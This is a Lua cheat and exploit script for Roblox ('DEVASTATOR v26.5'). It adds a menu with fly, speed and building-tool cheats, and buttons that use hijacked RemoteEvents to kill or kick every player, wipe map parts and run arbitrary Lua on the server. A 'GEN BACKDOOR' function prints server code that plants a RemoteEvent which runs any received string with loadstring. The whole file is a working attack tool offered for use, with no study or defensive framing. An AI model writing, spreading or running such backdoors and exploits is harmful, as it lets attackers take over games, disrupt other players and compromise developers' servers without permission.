--[[
    DEVASTATOR v26.5 // ULTIMATE OVERLORD
    AUTH: PISHENAK
    CONTROLS: 'L' - Menu | 'E' - Fly | 'Q' - Speed Up
]]

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local coreGui = game:GetService("CoreGui")
local lighting = game:GetService("Lighting")

-- [1] UI INITIALIZATION
for _, v in pairs(coreGui:GetChildren()) do if v.Name == "Devastatorv26" then v:Destroy() end end
local sg = Instance.new("ScreenGui", coreGui) sg.Name = "Devastatorv26"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 620, 0, 520)
main.Position = UDim2.new(0.5, -310, 0.5, -260)
main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
main.BorderSizePixel = 0
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main) stroke.Color = Color3.fromRGB(255, 0, 0) stroke.Thickness = 2

-- ТИТУЛЬНАЯ ПАНЕЛЬ (DRAG REGION)
local title = Instance.new("Frame", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
Instance.new("UICorner", title)

local titleText = Instance.new("TextLabel", title)
titleText.Size = UDim2.new(1, -20, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.Text = "DEVASTATOR v26.5 // OVERLORD STATUS: STANDBY"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.Font = Enum.Font.Code
titleText.BackgroundTransparency = 1
titleText.TextXAlignment = Enum.TextXAlignment.Left

-- ТЕРМИНАЛ
local logBox = Instance.new("ScrollingFrame", main)
logBox.Size = UDim2.new(1, -20, 0, 100)
logBox.Position = UDim2.new(0, 10, 1, -110)
logBox.BackgroundColor3 = Color3.new(0, 0, 0)
logBox.BorderSizePixel = 0
local logLay = Instance.new("UIListLayout", logBox)

local function log(txt, col)
    local l = Instance.new("TextLabel", logBox)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = " [SYSTEM]: " .. txt
    l.TextColor3 = col or Color3.fromRGB(200, 0, 0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextXAlignment = Enum.TextXAlignment.Left
    logBox.CanvasSize = UDim2.new(0, 0, 0, logLay.AbsoluteContentSize.Y)
    logBox.CanvasPosition = Vector2.new(0, logLay.AbsoluteContentSize.Y)
end

-- [2] DRAG SYSTEM (MODERN)
local dragging, dragStart, startPos
title.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = main.Position end end)
uis.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
    local delta = i.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end end)
uis.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

-- [3] FLY & UTILS
local flying = false
local flySpeed = 60
local bv, bg

local function toggleFly()
    flying = not flying
    local char = lp.Character or lp.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    if flying then
        bv = Instance.new("BodyVelocity", hrp) bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
        bg = Instance.new("BodyGyro", hrp) bg.MaxTorque = Vector3.new(1e8, 1e8, 1e8)
        log("FLY: ON", Color3.new(0, 1, 0))
        task.spawn(function()
            while flying do
                local cam = workspace.CurrentCamera
                local vel = Vector3.new(0, 0.1, 0)
                if uis:IsKeyDown(Enum.KeyCode.W) then vel = cam.CFrame.LookVector * flySpeed end
                if uis:IsKeyDown(Enum.KeyCode.S) then vel = cam.CFrame.LookVector * -flySpeed end
                bv.Velocity = vel
                bg.CFrame = cam.CFrame
                task.wait()
            end
        end)
    else
        if bv then bv:Destroy() end if bg then bg:Destroy() end
        log("FLY: OFF", Color3.new(1, 0, 0))
    end
end

-- [4] GLOBAL SEND (SS CONNECTION)
local function ss(code, val)
    local remote = rs:FindFirstChild("NetworkStream") or rs:FindFirstChild("InternalStatus")
    if remote then
        remote:FireServer(code, val)
        log("SS COMMAND SENT", Color3.new(0, 1, 0))
        titleText.Text = "DEVASTATOR v26.5 // STATUS: SS CONNECTED"
    else
        log("SS NOT DETECTED - APPLYING LOCAL", Color3.new(1, 0.5, 0))
        if code == 882 then -- Local Sky backup
            local s = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", lighting)
            s.SkyboxBk = val s.SkyboxDn = val s.SkyboxFt = val
        end
    end
end

-- [5] INTERFACE ELEMENTS
local idInput = Instance.new("TextBox", main)
idInput.Size = UDim2.new(0, 420, 0, 35)
idInput.Position = UDim2.new(0.5, -210, 0, 50)
idInput.PlaceholderText = "ASSET ID / LUA CODE"
idInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
idInput.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", idInput)

local grid = Instance.new("Frame", main)
grid.Size = UDim2.new(1, -20, 0, 240)
grid.Position = UDim2.new(0, 10, 0, 95)
grid.BackgroundTransparency = 1
Instance.new("UIGridLayout", grid).CellSize = UDim2.new(0, 145, 0, 35)

local function btn(txt, cb, col)
    local b = Instance.new("TextButton", grid)
    b.Text = txt b.BackgroundColor3 = col or Color3.fromRGB(45, 5, 5)
    b.TextColor3 = Color3.new(1, 1, 1) b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb) Instance.new("UICorner", b)
end

-- КНОПКИ ПАНЕЛИ
btn("GLOBAL SKY", function() ss(882, "rbxassetid://"..idInput.Text) end)
btn("GLOBAL AUDIO", function() ss(993, "rbxassetid://"..idInput.Text) end)
btn("GIVE HAMMER", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("B-Tools Added") end)
btn("FLY (E)", toggleFly)
btn("SPEED + (Q)", function() flySpeed = flySpeed + 25 log("SPEED: "..flySpeed) end)

-- ПАНЕЛЬ ХАОСА (SERVER SIDE)
btn("KILL ALL", function() ss(771, "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end") end, Color3.fromRGB(120, 0, 0))
btn("KICK ALL", function() ss(771, "for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick('DEVASTATED') end end") end, Color3.fromRGB(120, 0, 0))
btn("DISCO WORLD", function() ss(771, "while task.wait(0.1) do for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v.Color = Color3.new(math.random(),math.random(),math.random()) end end end") end)
btn("NUKE MAP", function() ss(771, "for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') then v:Destroy() end end") end, Color3.fromRGB(180, 0, 0))
btn("REMOTE EXEC", function() ss(771, idInput.Text) end, Color3.fromRGB(0, 120, 0))

btn("GEN BACKDOOR", function()
    local c = "local _s=game:GetService('ReplicatedStorage') local _r=Instance.new('RemoteEvent',_s) _r.Name='NetworkStream' _r.OnServerEvent:Connect(function(_,i,v) if i==882 then local l=game:GetService('Lighting') local k=l:FindFirstChildOfClass('Sky') or Instance.new('Sky',l) k.SkyboxBk=v k.SkyboxDn=v k.SkyboxFt=v k.SkyboxLf=v k.SkyboxRt=v k.SkyboxUp=v elseif i==993 then local sn=Instance.new('Sound',workspace) sn.SoundId=v sn.Volume=10 sn:Play() elseif i==771 then loadstring(v)() end end)"
    print(c) log("BACKDOOR IN F9 CONSOLE", Color3.new(1, 1, 0))
end, Color3.fromRGB(100, 80, 0))

-- [6] INPUT BINDS
uis.InputBegan:Connect(function(k, g)
    if g then return end
    if k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible end
    if k.KeyCode == Enum.KeyCode.E then toggleFly() end
    if k.KeyCode == Enum.KeyCode.Q then flySpeed = flySpeed + 20 end
end)

log("DEVASTATOR v26.5 LOADED.")
log("READY FOR SYSTEM BREACH.")
